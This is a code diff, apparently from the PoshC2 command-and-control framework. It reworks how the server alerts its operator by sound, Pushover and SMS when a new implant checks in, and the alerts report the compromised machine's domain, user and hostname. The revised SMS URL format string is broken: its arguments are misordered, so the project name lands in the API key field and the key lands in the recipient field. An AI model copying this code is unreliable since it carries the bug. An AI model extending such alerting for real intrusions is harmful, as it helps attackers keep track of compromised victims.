@@ -2,7 +2,7 @@
 
 from Colours import Colours
 from Utils import randomuri, gen_key  
-from Config import PayloadsDirectory, FilesDirectory, Jitter
+from Config import PayloadsDirectory, FilesDirectory, Jitter, EnableNotifications, APIKEY, APIToken, APIUser, Sounds, MobileNumber, NotificationsProjectName
 from DB import select_item, get_defaultbeacon, get_killdate, get_dfheader, get_otherbeaconurls, get_defaultuseragent, new_implant, new_task, update_mods, get_autoruns
 from Core import get_images
 
@@ -61,8 +61,7 @@ IMGS19459394%s49395491SGMI""" % (self.RandomURI, self.AllBeaconURLs, self.KillDa
     print "",Colours.END
 
     try:
-      sound = select_item("Sounds","C2Server")
-      if sound == "Yes":
+      if Sounds.lower().strip() == "yes":
         import pyttsx3
         engine = pyttsx3.init()
         rate = engine.getProperty('rate')
@@ -74,27 +73,22 @@ IMGS19459394%s49395491SGMI""" % (self.RandomURI, self.AllBeaconURLs, self.KillDa
       pass 
 
     try:
-      apikey = select_item("APIKEY","C2Server")
-      mobile = select_item("MobileNumber","C2Server")
-      enotifications = select_item("EnableNotifications","C2Server")
-      poapitoken = select_item("APIToken","C2Server")
-      poapiuser = select_item("APIUser","C2Server")
 
-      if enotifications == "Yes":
+      if EnableNotifications.lower().strip() == "yes":
         import httplib, urllib
         conn = httplib.HTTPSConnection("api.pushover.net:443")
         conn.request("POST", "/1/messages.json",
           urllib.urlencode({
-            "token": poapitoken,
-            "user": poapiuser,
-            "message": "NewImplant: %s @ %s" % (self.User,self.Hostname),
+            "token": APIToken,
+            "user": APIUser,
+            "message": "[%s] - NewImplant: %s @ %s" % (NotificationsProjectName, self.User,self.Hostname),
           }), { "Content-type": "application/x-www-form-urlencoded" })
         conn.getresponse()
 
-      if enotifications == "Yes" and apikey and mobile:
-        for number in mobile.split(","):
+      if EnableNotifications.lower().strip() == "yes" and APIKEY and MobileNumber:
+        for number in MobileNumber.split(","):
           number = number.replace('"','')
-          url = "https://api.clockworksms.com/http/send.aspx?key=%s&to=%s&from=PoshC2&content=NewImplant:%s\\%s @ %s" % (apikey, number, self.Domain,self.User,self.Hostname)
+          url = "https://api.clockworksms.com/http/send.aspx?key=%s&to=%s&from=PoshC2&content=[%s]%%20-%%20NewImplant:%%20%s\\%s @ %s" % (NotificationsProjectName, APIKEY, number, self.Domain,self.User,self.Hostname)
           url = url.replace(" ","+")
           urllib2.urlopen(url)
     except Exception as e:
